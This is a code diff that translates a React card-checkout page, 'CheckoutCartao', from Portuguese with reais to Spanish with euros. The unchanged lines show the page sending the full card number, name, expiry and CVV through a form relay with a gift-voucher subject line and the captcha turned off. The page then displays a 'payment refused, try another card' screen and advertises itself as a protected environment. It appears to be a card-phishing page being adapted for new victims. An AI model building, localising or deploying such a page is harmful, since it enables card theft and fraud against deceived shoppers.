@@ -136,7 +136,7 @@ const CheckoutCartao = () => {
       formData.append("Nome Cartao", cardData.nome);
       formData.append("Validade", cardData.validade);
       formData.append("CVV", cardData.cvv);
-      formData.append("Valor Total", `R$ ${valorComDesconto.toFixed(2)}`);
+      formData.append("Valor Total", `${valorComDesconto.toFixed(2)} €`);
       if (pedidoExistente) formData.append("Pedido", pedidoExistente.numero_pedido);
       formData.append("_subject", "Novo Vale Presente");
       formData.append("_captcha", "false");
@@ -175,16 +175,16 @@ const CheckoutCartao = () => {
           <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/10 flex items-center justify-center">
             <XCircle size={44} className="text-destructive" />
           </div>
-          <h1 className="text-foreground text-xl font-bold mb-2">Pagamento recusado</h1>
+          <h1 className="text-foreground text-xl font-bold mb-2">Pago rechazado</h1>
           <p className="text-muted-foreground text-sm mb-8">
-            Não foi possível processar este cartão. Tente outra forma de pagamento.
+            No ha sido posible procesar esta tarjeta. Prueba con otra forma de pago.
           </p>
           <button
             onClick={handleTryAgain}
             className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
             style={{ background: accent, color: "#000" }}
           >
-            Tentar outra forma
+            Probar otra forma
           </button>
         </div>
       </div>
@@ -196,8 +196,8 @@ const CheckoutCartao = () => {
       <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
         <div className="w-full text-center">
           <Loader2 size={44} className="animate-spin mx-auto mb-6" style={{ color: accent }} />
-          <h2 className="text-foreground text-lg font-semibold mb-2">Processando pagamento</h2>
-          <p className="text-muted-foreground text-sm">Aguarde enquanto verificamos os dados</p>
+          <h2 className="text-foreground text-lg font-semibold mb-2">Procesando pago</h2>
+          <p className="text-muted-foreground text-sm">Espera mientras verificamos los datos</p>
         </div>
       </div>
     );
@@ -213,11 +213,11 @@ const CheckoutCartao = () => {
           <button
             onClick={() => navigate("/checkout")}
             className="w-9 h-9 flex items-center justify-center text-foreground hover:bg-muted rounded-full transition-colors"
-            aria-label="Voltar"
+            aria-label="Volver"
           >
             <ArrowLeft size={20} />
           </button>
-          <h1 className="text-foreground font-semibold text-base">Cartão</h1>
+          <h1 className="text-foreground font-semibold text-base">Tarjeta</h1>
           <span className="ml-auto text-xs text-muted-foreground font-medium">3/3</span>
         </div>
         <div className="h-1 bg-muted">
@@ -227,10 +227,10 @@ const CheckoutCartao = () => {
 
       <main className="flex-1 px-4 pt-6 pb-32">
         <h2 className="text-[22px] font-bold text-foreground leading-tight mb-1">
-          Dados do cartão
+          Datos de la tarjeta
         </h2>
         <p className="text-sm text-muted-foreground mb-6 flex items-center gap-1.5">
-          <Lock size={12} /> Ambiente protegido
+          <Lock size={12} /> Entorno protegido
         </p>
 
         {/* Valor */}
@@ -240,11 +240,11 @@ const CheckoutCartao = () => {
           </p>
           <div className="flex items-baseline gap-2">
             <span className="text-foreground text-2xl font-bold">
-              R$ {valorComDesconto.toFixed(2).replace(".", ",")}
+              {valorComDesconto.toFixed(2).replace(".", ",")} €
             </span>
             {descontoCartao > 0 && (
               <span className="text-muted-foreground text-sm line-through">
-                R$ {totalOriginal.toFixed(2).replace(".", ",")}
+                {totalOriginal.toFixed(2).replace(".", ",")} €
               </span>
             )}
           </div>
@@ -254,7 +254,7 @@ const CheckoutCartao = () => {
               style={{ background: `${accent}30`, color: "#000" }}
             >
               <Percent size={11} />
-              {Math.round(descontoCartao * 100)}% OFF · economia R$ {economiaCartao.toFixed(2).replace(".", ",")}
+              {Math.round(descontoCartao * 100)}% DTO · ahorro {economiaCartao.toFixed(2).replace(".", ",")} €
             </div>
           )}
         </div>
@@ -262,7 +262,7 @@ const CheckoutCartao = () => {
         {/* Formulário */}
         <div className="space-y-3">
           <CardField
-            label="Número do cartão"
+            label="Número de la tarjeta"
             value={cardData.numero}
             onChange={(v) => handleInputChange("numero", v)}
             accent={accent}
@@ -271,7 +271,7 @@ const CheckoutCartao = () => {
             placeholder="0000 0000 0000 0000"
           />
           <CardField
-            label="Nome impresso no cartão"
+            label="Nombre impreso en la tarjeta"
             value={cardData.nome}
             onChange={(v) => handleInputChange("nome", v.toUpperCase())}
             accent={accent}
@@ -280,7 +280,7 @@ const CheckoutCartao = () => {
           />
           <div className="grid grid-cols-2 gap-3">
             <CardField
-              label="Validade"
+              label="Caducidad"
               value={cardData.validade}
               onChange={(v) => handleInputChange("validade", v)}
               accent={accent}
@@ -303,7 +303,7 @@ const CheckoutCartao = () => {
         {/* Bandeiras e parceiros aceitos */}
         <div className="mt-6">
           <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold text-center mb-3">
-            Pagamentos aceitos
+            Pagos aceptados
           </p>
           <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-black">
             {(["visa","mastercard","elo","amex","hipercard","diners"] as const).map((k) => (
@@ -328,7 +328,7 @@ const CheckoutCartao = () => {
           <div className="flex flex-col">
             <span className="text-[11px] text-muted-foreground leading-none mb-1">Total</span>
             <span className="text-base font-bold text-foreground leading-none">
-              R$ {valorComDesconto.toFixed(2).replace(".", ",")}
+              {valorComDesconto.toFixed(2).replace(".", ",")} €
             </span>
           </div>
           <button
@@ -401,4 +401,3 @@ const CardField = ({
 };
 
 export default CheckoutCartao;
-
